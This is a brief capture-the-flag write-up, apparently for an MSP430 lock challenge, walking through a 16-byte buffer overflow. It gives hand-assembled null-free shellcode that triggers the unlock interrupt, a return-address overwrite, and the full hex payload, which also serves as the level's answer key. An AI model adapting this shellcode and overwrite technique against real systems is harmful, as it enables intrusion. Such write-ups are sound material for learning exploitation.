This is another overflow except null bytes are a bad char for shellcode in the input.  

16 byte buffer + return address.

I just need to rewrite the shellcode to remove nulls.

we want to push 0x7f as the interrupt call then call whatever the address is of the INT function (looked up in the debugger)

I ended up with

3440 8f11        mov #0x118f, r4             (0x007f + 0x1100 to remove nulls)
3480 1011        sub #0x1110, r4             (subtract from 0x118f to get 0x007f without nulls in opcodes)
0412             push r4
b012 4c45        call #0x454c                (call interrupt)
4141                                         (filler to get to 16 bytes)

buffer lands at 43ee (don't forget endianness).  

I attempted to use mov.b for the shellcode but that still included nulls for some reason.. so I switched to the subtraction instead. 

pw is:
34408f11348010110412b0124c454141ee43
